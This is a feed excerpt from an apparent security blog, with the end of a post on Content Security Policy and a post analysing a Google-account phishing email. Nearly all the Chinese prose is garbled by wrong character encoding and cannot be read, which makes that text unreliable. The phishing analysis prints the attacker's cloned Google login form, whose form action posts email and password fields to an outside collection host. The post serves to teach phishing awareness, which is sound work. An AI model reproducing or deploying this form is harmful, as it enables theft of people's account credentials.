&lt;p&gt;Áî±ÁôºÈÄÅÂÖßÂÆπÂèØÁúãÂá∫ÈÄôÂÄã request Âõ†ÁÇ∫ÈÅïÂèç‰∫Ü„Äåimg-src https:„ÄçË¶èÂâáËÄåÂ∞á„Äåhttp://devco.re/„ÄçÈÄôÂÄã‰æÜÊ∫êÊìãÊéâ„ÄÇÁ∂ìÁî±Ê≠§ÊñπÂºèÔºåÂèØ‰∏ÄÈÇä‰øÆÊîπÁ∂≤Á´ô‰∏ÄÈÇäËßÄÂØüÊòØÂê¶‰ªçÊúâ‰∏çÁ¨¶Âêà CSP Ë¶èÁØÑ‰πãËôïÔºåÁ≠âÂà∞ÊâÄÊúâÈÅïË¶èÁöÑÂÖßÂÆπÈÉΩ‰øÆÊ≠£ÂÆåÁï¢ÂæåÔºåÂÜçÂ∞á CSP Â•óÁî®Âà∞Ê≠£Âºè‰∏äÁ∑öÁí∞Â¢É„ÄÇ&lt;/p&gt;

&lt;p&gt;Áî±ÊñºÂÆ£ÂëäÊñπÂºèÈùûÂ∏∏Â§öÁ®ÆÔºåÂú®ÈÄôÈÇäÂ∞±‰∏ç‰∏Ä‰∏ÄÊ¢ùÂàóÔºåËã•ÊúâËààË∂£ÂèØÂâçÂæÄ &lt;a href=&quot;https://content-security-policy.com/&quot;&gt;Content Security Policy Reference &amp;amp; Examples&lt;/a&gt;„ÄÅ&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP&quot;&gt;Using Content Security Policy - Security | MDN&lt;/a&gt; Á≠âÁ∂≤È†ÅÔºåÊúâÊõ¥ÂÆåÊï¥ÁöÑ‰ΩøÁî®ÊÉÖÂ¢ÉËàáÁØÑ‰æãÂèØ‰æõÂèÉËÄÉ„ÄÇÂè¶Â§ñ‰πüÊúâ &lt;a href=&quot;http://benvinegar.github.io/csp-talk-2013/&quot;&gt;Slide&lt;/a&gt; (by Ben Vinegar) Ë∑ü &lt;a href=&quot;https://www.youtube.com/watch?v=pocsv39pNXA&quot;&gt;YouTube ÂΩ±Áâá&lt;/a&gt; (by Adam Barth) ÂèØÂèÉËÄÉ„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;csp-ÂØ¶Èöõ‰ΩøÁî®Ê°à‰æã&quot;&gt;CSP ÂØ¶Èöõ‰ΩøÁî®Ê°à‰æã&lt;/h3&gt;

&lt;p&gt;ÁõÆÂâçÊé°Áî® CSP ÁöÑÊ°à‰æãËºÉÂ∞ëÔºåÊØîËºÉÁü•ÂêçÁöÑ‰ΩøÁî®Ê°à‰æãÊòØ &lt;a href=&quot;https://github.com/&quot;&gt;GitHub&lt;/a&gt;ÔºåÂú® 2013 Âπ¥ 4 Êúà &lt;a href=&quot;https://github.com/blog/1477-content-security-policy&quot;&gt;GitHub ÈÇÑÂØ´‰∫Ü‰∏ÄÁØáÂ∞àÊñá&lt;/a&gt;ÂÖ¨ÂëäË°®Á§∫‰ªñÂÄëÂ∑≤ÈñãÂßãÊé°Áî® CSP„ÄÇÂè¶Â§ñ‰∏ÄÂÄãÊ°à‰æãÂª†ÂïÜÂèØËÉΩËºÉÂª£ÁÇ∫‰∫∫Áü•ÔºåÊòØÂú® 2013 Âπ¥Áï∂Á¥ÖÁöÑÂÖçË≤ªÂÑ≤Â≠òÁ©∫Èñì &lt;a href=&quot;https://mega.co.nz/&quot;&gt;MEGA&lt;/a&gt;„ÄÇÂÖ©ÂÄãÊ°à‰æãÁöÑÂØ¶ÈöõÂÖßÂÆπÂèØË¶ãÊñº‰∏ãÂúñÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/http-headers-github-and-mega.jpg&quot; title=&quot;GitHub Ëàá MEGA ‰ΩøÁî® CSP ÂæåÁöÑ HTTP response&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/http-headers-github-and-mega.jpg&quot; alt=&quot;GitHub Ëàá MEGA ‰ΩøÁî® CSP ÂæåÁöÑ HTTP response&quot; title=&quot;GitHub Ëàá MEGA ‰ΩøÁî® CSP ÂæåÁöÑ HTTP response&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Âè¶‰∏ÄÈ†ÖÁü•Âêç‰ΩøÁî®Ê°à‰æãÊòØ Google ÊòéÂÆö&lt;a href=&quot;https://developer.chrome.com/extensions/contentSecurityPolicy&quot;&gt;ÈñãÁôº Chrome Extension ÊôÇÂøÖÈ†à‰ΩøÁî® CSP&lt;/a&gt;Ôºå‰ª•ËøΩÊ±ÇÊõ¥È´òÁöÑÂÆâÂÖ®ÊÄß„ÄÇMozilla ‰πüÂú® &lt;a href=&quot;https://wiki.mozilla.org/Security/CSP/Specification&quot;&gt;MozillaWiki Èñã‰∫Ü‰∏ÄÈ†Å&lt;/a&gt;Â≠òÊîæÁõ∏ÈóúÊäÄË°ìÁ¥∞ÁØÄ„ÄÇËã•ÊÇ®ÊÉ≥ËßÄÂØüÂÖ∂‰ªñ‰ΩøÁî®Ê°à‰æãÔºåÂèØ‰ΩøÁî® Chrome Inspector Êàñ curl ËßÄÂØü‰ª•‰∏ãÂπæÂÄãÁ∂≤Á´ôÔºö&lt;a href=&quot;https://lastpass.com/&quot;&gt;LastPass&lt;/a&gt;Ôºå&lt;a href=&quot;https://twitter.com/&quot;&gt;Twitter&lt;/a&gt;Ôºå&lt;a href=&quot;https://1password.com/&quot;&gt;1Password&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;csp-Â∏∏Ë¶ãË™§Áî®Ê°à‰æã&quot;&gt;CSP Â∏∏Ë¶ãË™§Áî®Ê°à‰æã&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;directives ÂæåÈù¢‰∏çÈúÄÂä†ÂÜíËôü&lt;/p&gt;

    &lt;p&gt;ÈåØË™§Ôºödefault-src: ‚Äòself‚Äô&lt;/p&gt;

    &lt;p&gt;Ê≠£Á¢∫Ôºö&lt;strong&gt;default-src ‚Äòself‚Äô&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;directives ‰πãÈñì‰ª•ÂàÜËôüÂçÄÈöî&lt;/p&gt;

    &lt;p&gt;ÈåØË™§Ôºödefault-src ‚Äòself‚Äô, script-src ‚Äòself‚Äô&lt;/p&gt;

    &lt;p&gt;Ê≠£Á¢∫Ôºö&lt;strong&gt;default-src ‚Äòself‚Äô; script-src ‚Äòself‚Äô&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Â§öÂÄã source ‰πãÈñìÂÉÖ‰ª•Á©∫ÁôΩÂçÄÈöî&lt;/p&gt;

    &lt;p&gt;ÈåØË™§Ôºödefault-src ‚Äòself‚Äô; img-src ‚Äòself‚Äô, img1.devco.re, img2.devco.re&lt;/p&gt;

    &lt;p&gt;Ê≠£Á¢∫Ôºö&lt;strong&gt;default-src ‚Äòself‚Äô; img-src ‚Äòself‚Äô img1.devco.re img2.devco.re&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Êüê‰∫õ source ÂøÖÈ†àÂä†ÂÜíËôüÔºàhttps:„ÄÅdata:Ôºâ&lt;/p&gt;

    &lt;p&gt;ÈåØË™§Ôºödefault-src ‚Äòself‚Äô; img-src ‚Äòself‚Äô https data&lt;/p&gt;

    &lt;p&gt;Ê≠£Á¢∫Ôºö&lt;strong&gt;default-src ‚Äòself‚Äô; img-src ‚Äòself‚Äô https: data:&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Êüê‰∫õ source ÂøÖÈ†àÁî®ÂñÆÂºïËôüÊã¨Ëµ∑‰æÜÔºà‚Äônone‚Äô„ÄÅ‚Äôself‚Äô„ÄÅ‚Äôunsafe-inline‚Äô„ÄÅ‚Äôunsafe-eval‚ÄôÔºâ&lt;/p&gt;

    &lt;p&gt;ÈåØË™§Ôºöscript-src self unsafe-inline unsafe-eval&lt;/p&gt;

    &lt;p&gt;Ê≠£Á¢∫Ôºö&lt;strong&gt;script-src ‚Äòself‚Äô ‚Äòunsafe-inline‚Äô ‚Äòunsafe-eval‚Äô&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÁµêË´ñ&quot;&gt;ÁµêË´ñ&lt;/h3&gt;

&lt;p&gt;‰ΩøÁî® CSP ÂèØ‰ª•ÊúâÊïàÊèêÂçáÊîªÊìäÈõ£Â∫¶ÔºåËÆìË®±Â§öÂ∏∏Ë¶ãÁöÑ XSS ÊîªÊìäÂ§±ÊïàÔºåÊòØ‰∏ÄÂÄãÈùûÂ∏∏Êé®Ëñ¶ÈñãÁôºËÄÖ‰ΩøÁî®ÁöÑ HTTP header„ÄÇ‰ΩÜÁî±ÊñºÁõÆÂâçÁöÑÈñãÁôºËÄÖÂú® HTML Ë£°Èù¢ÂØ´ inline script Âèä inline CSS ÁöÑÊØî‰æãÈùûÂ∏∏È´òÔºåÂêåÊôÇ‰πüÊúâ‰∏Ä‰∫õÁ∂≤Ë∑ØÊúçÂãôÈ†êË®≠ÈÉΩÈúÄË¶Å‰ΩøÁî® inline scriptÔºà‰æãÂ¶Ç Google AnalyticsÔºåÁõ∏ÈóúËß£Ê≥ïÂèØÂèÉËÄÉ&lt;a href=&quot;http://stackoverflow.com/questions/3870345/new-google-analytics-code-into-external-file&quot;&gt;ÈÄôË£°&lt;/a&gt;ÔºâÔºåÂõ†Ê≠§Ë¶Å‰∫´ÂèóÈÄôÊ®£ÁöÑÂÆâÂÖ®‰πãÂâçÔºåÂèØËÉΩÈúÄË¶ÅÂÖà‰ªòÂá∫Ë®±Â§öÊôÇÈñìËàáÂøÉÂäõÂ∞áÁ∂≤Á´ôÂ§ßÂπÖÊï¥ÁêÜÔºåÂ•óÁî® CSP Ë¶èÁØÑÂæåÁ∂≤È†ÅÊâçËÉΩÊ≠£Â∏∏ÈÅã‰Ωú„ÄÇ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/</link>
                <guid>https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy</guid>
                <pubDate>Tue, 08 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Google Â∏≥ËôüÈá£È≠öÊ°à‰æã</title>
                <description>&lt;p&gt;ÊúÄËøëË∫´ÈÇäÁöÑÊúãÂèã‰∏çÊñ∑ÁöÑÊî∂Âà∞ Gmail ‰∏≠ Google ÁöÑË≠¶ÂëäÔºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-01.png&quot; alt=&quot;Gmail state-sponsored attacker warning&quot; title=&quot;Gmail state-sponsored attacker warning&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-03.png&quot; alt=&quot;Gmail ÂúãÂÆ∂Ë≥áÂä©ÁöÑÊîªÊìäËÄÖË≠¶Âëä&quot; title=&quot;Gmail ÂúãÂÆ∂Ë≥áÂä©ÁöÑÊîªÊìäËÄÖË≠¶Âëä&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Èß≠ÂÆ¢ÈñìÁöÑÊà∞Áà≠Â∑≤Á∂ì‰∏çÂè™ÊòØÂÄã‰∫∫Â∞çÂÄã‰∫∫ÔºåËÄåÂ∑≤Á∂ìÊì¥Â§ßÊàêÂúãÂÆ∂Â∞çÂúãÂÆ∂„ÄÇ‰∏ÄÂÄãÂúãÂÆ∂ÁÇ∫‰∫ÜÁç≤Âèñ‰ªñÂúãÁöÑÊ©üÂØÜÊñá‰ª∂„ÄÅÊÉÖÂ†±„ÄÅÂÄã‰∫∫Ë≥áÊñôÁ≠âÔºåÈÉΩÊúÉÊÉ≥Áõ°ÂêÑÁ®ÆËæ¶Ê≥ïÂÖ•‰æµÂ∏≥Ëôü„ÄÅÂØÑÈÄÅÊÉ°ÊÑèÈÉµ‰ª∂„ÄÅÈá£È≠öÁõúÂèñÂØÜÁ¢ºÁ≠â„ÄÇËÄåË∫´ÁÇ∫ÂèóÂÆ≥ËÄÖÁöÑÊàëÂÄëËÉΩÂÅö‰ªÄÈ∫ºÂë¢ÔºüGoogle ÂÆòÊñπÊèêÂá∫ÁöÑÂª∫Ë≠∞ÊòØÔºöÂä†Âº∑ÂØÜÁ¢ºÂÆâÂÖ®„ÄÅÊ≥®ÊÑèÁôªÂÖ• IP ‰ΩçÂùÄ„ÄÅÊõ¥Êñ∞Ëá™Â∑±‰ΩøÁî®ÁöÑËªüÈ´î„ÄÅ&lt;a href=&quot;https://support.google.com/accounts/answer/180744?hl=zh-Hant&quot;&gt;ÈñãÂïü‰∫åÈöéÊÆµÈ©óË≠â&lt;/a&gt;„ÄÇÁï∂ÁÑ∂ÊúâËâØÂ•ΩÁöÑË≥áÂÆâÊÑèË≠òÊâçÊòØÊõ¥ÈáçË¶ÅÁöÑ„ÄÇ&lt;/p&gt;

&lt;p&gt;Ê≠£Â•Ω‰ªäÂ§©Êî∂Âà∞‰∏ÄÂÄãÁ∞°ÂñÆÁöÑÊ°à‰æãÔºåÊèê‰æõÁµ¶ÂêÑ‰ΩçÂèÉËÄÉ„ÄÇ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Âú®‰ø°ÁÆ±‰∏≠Ë∫∫Ëëó‰∏ÄÂ∞ÅÂæàÂÉèÊòØÂúãÂ§ñÂÆ¢Êà∂ÁöÑ‰ø°‰ª∂„ÄåCompany Profile / Order Details„Äç„ÄÇÂÖßÂÆπÁúãËµ∑‰æÜ‰πüÂæàÊ≠£Â∏∏Ôºå‰∏¶‰∏îÈôÑ‰∏ä‰∫ÜÂÖ¨Âè∏ÁöÑÂü∫Êú¨Ë≥áÊñôÁÇ∫ÈôÑÂä†Ê™îÊ°à„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-04.png&quot; alt=&quot;Èá£È≠ö‰ø°‰ª∂&quot; title=&quot;Èá£È≠ö‰ø°‰ª∂&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÈªûÈñãÈôÑ‰ª∂ÔºåÊúÉÁôºÁèæÁï´Èù¢ÂÖàË∑≥‰∫Ü JavaScript Ë≠¶ÂëäË¶ñÁ™óÂæåÔºåÈö®Âç≥Â∞éÂêëÂà∞ Google ÁôªÂÖ•È†ÅÈù¢„ÄÇ&lt;/p&gt;

&lt;p&gt;Ê≥®ÊÑèÁúãÔºåÈÄôÂÄãÁôªÂÖ•È†ÅÈù¢ÊòØÁúüÁöÑÂóéÔºüÊúâÊ≤íÊúâÁôºÁèæÁï´Èù¢‰∏äÁöÑ„ÄåStay signed in„ÄçÂâçÈù¢ÁöÑÂãæËÆäÊàêÊñπÊ°Ü‰∫ÜÔºüÁÄèË¶ΩÂô®‰∏äÁöÑÁ∂≤ÂùÄ‰πüÊòØÂú®Êú¨Ê©üÁöÑ‰ΩçÂùÄ„ÄÇÊÉ≥ÊÉ≥ÁúãÔºåÊÄéÈ∫ºÂèØËÉΩÈªû‰∫ÜÈôÑ‰ª∂‰πãÂæåÔºåË∑≥ËΩâÂà∞ Google ÁôªÂÖ•Áï´Èù¢Ôºü&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-05.png&quot; alt=&quot;Èá£È≠ö‰ø°‰ª∂ÈôÑ‰ª∂ÂÅáÂÜí Google ÁôªÂÖ•&quot; title=&quot;Èá£È≠ö‰ø°‰ª∂ÈôÑ‰ª∂ÂÅáÂÜí Google ÁôªÂÖ•&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ËÆìÊàëÂÄëÁúã‰∏Ä‰∏ãÂéüÂßãÁ¢ºÔºåÊúÉÁôºÁèæ‰ªñÁöÑ form Ë¢´ÊîπÊàê‰∏ÄÂÄãÂ•áÊÄ™ÁöÑÁ∂≤ÂùÄÔºåÁúãËµ∑‰æÜÂ∞±ÊòØÊÉ°ÊÑèÁ∂≤Á´ô„ÄÇÂÖ∂È§òÁ∂≤È†ÅÁöÑÈÉ®‰ªΩÈÉΩÊòØÂæû Google ÁúüÂØ¶ÁöÑÁôªÂÖ•È†ÅÈù¢ÊäìÂèñ‰∏ã‰æÜ‰øÆÊîπÁöÑ„ÄÇÂõ†Ê≠§Âè™Ë¶Å‰∏Ä‰∏çÊ≥®ÊÑèÔºåÂ∞±ÊúÉ‰ª•ÁÇ∫ÊòØÁúüÁöÑ Google ÁôªÂÖ•Áï´Èù¢ËÄåËº∏ÂÖ•Â∏≥ËôüÂØÜÁ¢º„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-06.png&quot; alt=&quot;Èá£È≠ö‰ø°‰ª∂ÂéüÂßãÁ¢º&quot; title=&quot;Èá£È≠ö‰ø°‰ª∂ÂéüÂßãÁ¢º&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÁØÄÈåÑÈÉ®ÂàÜ code Â¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;novalidate=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://cantonfair.a78.org/yahoo/post.php&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;gaia_loginform&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GALX&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;6UMbQQmFgwI&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;continue&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://mail.google.com/mail/&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;service&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mail&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hl&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;scc&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sacu&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;_utf8&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;_utf8&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;‚òÉ&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bgresponse&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bgresponse&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;js_disabled&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pstMsg&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pstMsg&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dnConn&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dnConn&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;checkConnection&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;checkConnection&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;youtube:424:1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;checkedDomains&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;checkedDomains&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;youtube&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden-label&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Email&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Email&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Email&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Email&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Email&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;spellcheck=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;email&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden-label&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Passwd&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Password&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Passwd&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Passwd&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
